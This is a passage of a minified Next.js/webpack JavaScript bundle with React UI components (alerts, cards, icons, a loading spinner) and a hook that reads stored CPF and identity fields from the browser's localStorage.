          })
        }
      };

      function d(e) {
        let {
          className: t,
          variant: r = "default",
          icon: n,
          children: a,
          ...i
        } = e, l = o[r];
        return (0, s.jsx)("div", {
          role: "alert",
          className: (0, c.cn)("p-3 rounded-r rounded-md", l
            .container, t),
          ...i,
          children: (0, s.jsxs)("div", {
            className: "flex gap-3 items-start",
            children: [(0, s.jsx)("div", {
              className: (0, c.cn)("shrink-0", l.text),
              children: n || l.icon
            }), (0, s.jsx)("div", {
              className: "flex-1",
              children: a
            })]
          })
        })
      }

      function u(e) {
        let {
          className: t,
          variant: r = "default",
          ...n
        } = e;
        return (0, s.jsx)("h4", {
          className: (0, c.cn)("text-base font-bold mb-1", o[r].text,
            t),
          ...n
        })
      }

      function h(e) {
        let {
          className: t,
          variant: r = "default",
          ...n
        } = e;
        return (0, s.jsx)("p", {
          className: (0, c.cn)("text-sm leading-relaxed", o[r].text,
            t),
          ...n
        })
      }
    },
    4861: (e, t, r) => {
      "use strict";
      r.d(t, {
        A: () => s
      });
      let s = (0, r(9946).A)("circle-x", [
        ["circle", {
          cx: "12",
          cy: "12",
          r: "10",
          key: "1mglay"
        }],
        ["path", {
          d: "m15 9-6 6",
          key: "1uzhvr"
        }],
        ["path", {
          d: "m9 9 6 6",
          key: "z0biqf"
        }]
      ])
    },
    5339: (e, t, r) => {
      "use strict";
      r.d(t, {
        A: () => s
      });
      let s = (0, r(9946).A)("circle-alert", [
        ["circle", {
          cx: "12",
          cy: "12",
          r: "10",
          key: "1mglay"
        }],
        ["line", {
          x1: "12",
          x2: "12",
          y1: "8",
          y2: "12",
          key: "1pkeuh"
        }],
        ["line", {
          x1: "12",
          x2: "12.01",
          y1: "16",
          y2: "16",
          key: "4dfq90"
        }]
      ])
    },
    5562: (e, t, r) => {
      "use strict";
      r.d(t, {
        Wu: () => l,
        ZB: () => i,
        Zp: () => a
      });
      var s = r(5155);
      r(2115);
      var n = r(9434);

      function a(e) {
        let {
          className: t,
          ...r
        } = e;
        return (0, s.jsx)("div", {
          className: (0, n.cn)(
            "w-full max-w-md mx-auto bg-white rounded-lg shadow-lg overflow-hidden",
            t),
          ...r
        })
      }

      function i(e) {
        let {
          children: t,
          className: r,
          ...a
        } = e;
        return (0, s.jsx)("div", {
          className: (0, n.cn)("flex items-center gap-2 mb-2", r),
          ...a,
          children: t
        })
      }

      function l(e) {
        let {
          className: t,
          ...r
        } = e;
        return (0, s.jsx)("div", {
          className: (0, n.cn)("p-4 space-y-6", t),
          ...r
        })
      }
    },
    6325: (e, t, r) => {
      "use strict";
      r.d(t, {
        a: () => a
      });
      var s = r(5155),
        n = r(1154);

      function a() {
        return (0, s.jsx)("div", {
          className: "fixed inset-0 z-50 flex items-center justify-center",
          style: {
            background: "linear-gradient(90deg, #015ea2, #1875a7, #2586a7, #3498a8)"
          },
          children: (0, s.jsx)(n.A, {
            className: "size-10 rounded-full animate-spin text-white"
          })
        })
      }
    },
    6695: (e, t, r) => {
      "use strict";
      r.d(t, {
        BT: () => c,
        Wu: () => o,
        ZB: () => l,
        Zp: () => a,
        aR: () => i
      });
      var s = r(5155);
      r(2115);
      var n = r(9434);

      function a(e) {
        let {
          className: t,
          ...r
        } = e;
        return (0, s.jsx)("div", {
          "data-slot": "card",
          className: (0, n.cn)(
            "bg-card text-card-foreground flex flex-col gap-3 rounded-xl border py-6 shadow-sm",
            t),
          ...r
        })
      }

      function i(e) {
        let {
          className: t,
          ...r
        } = e;
        return (0, s.jsx)("div", {
          "data-slot": "card-header",
          className: (0, n.cn)(
            "@container/card-header grid auto-rows-min grid-rows-[auto_auto] items-start gap-1.5 px-4 has-data-[slot=card-action]:grid-cols-[1fr_auto] [.border-b]:pb-6",
            t),
          ...r
        })
      }

      function l(e) {
        let {
          className: t,
          ...r
        } = e;
        return (0, s.jsx)("div", {
          "data-slot": "card-title",
          className: (0, n.cn)("leading-none font-semibold", t),
          ...r
        })
      }

      function c(e) {
        let {
          className: t,
          ...r
        } = e;
        return (0, s.jsx)("div", {
          "data-slot": "card-description",
          className: (0, n.cn)("text-muted-foreground text-sm", t),
          ...r
        })
      }

      function o(e) {
        let {
          className: t,
          ...r
        } = e;
        return (0, s.jsx)("div", {
          "data-slot": "card-content",
          className: (0, n.cn)("px-4", t),
          ...r
        })
      }
    },
    6929: (e, t, r) => {
      "use strict";
      r.d(t, {
        B: () => a
      });
      var s = r(2115),
        n = r(1884);

      function a() {
        let [e, t] = (0, s.useState)(null), [r, a] = (0, s.useState)(!0);
        (0, s.useEffect)(() => {
          let e = localStorage.getItem("cpf-data");
          if (e) try {
            let r = JSON.parse(e);
            t(r)
          } catch (e) {
            localStorage.removeItem("cpf-data"), t(null)
          }
          a(!1)
        }, []);
        let i = (0, s.useMemo)(() => (null == e ? void 0 : e.name) ? (0, n
            .kR)(e.name) : null, [null == e ? void 0 : e.name]),
          l = (0, s.useMemo)(() => (null == e ? void 0 : e.firstName) ? (
            0, n.kR)(e.firstName) : null, [null == e ? void 0 : e
            .firstName
          ]),
          c = (0, s.useMemo)(() => (null == e ? void 0 : e.motherName) ? (
            0, n.kR)(e.motherName) : null, [null == e ? void 0 : e
            .motherName
          ]),
          o = (null == e ? void 0 : e.cpf) || null,
          d = (null == e ? void 0 : e.birthDate) || null;
        return {
          isLoading: r,
          isEmpty: !e,
          isInvalid: !i || !o || !d || !c,
          name: i,
          firstName: l,
          cpf: o,
          birthDate: d,
          motherName: c,
          gender: (null == e ? void 0 : e.gender) || null,
          full: e
        }
      }
    },
    8742: (e, t, r) => {
      Promise.resolve().then(r.bind(r, 780))
    },
    9434: (e, t, r) => {
      "use strict";
      r.d(t, {
        cn: () => a
      });
      var s = r(2596),
        n = r(9688);

      function a() {
        for (var e = arguments.length, t = Array(e), r = 0; r < e; r++) t[
          r] = arguments[r];
        return (0, n.QP)((0, s.$)(t))
      }
    }
  },
  e => {
    var t = t => e(e.s = t);
    e.O(0, [613, 635, 279, 441, 684, 358], () => t(8742)), _N_E = e.O()
  }
]);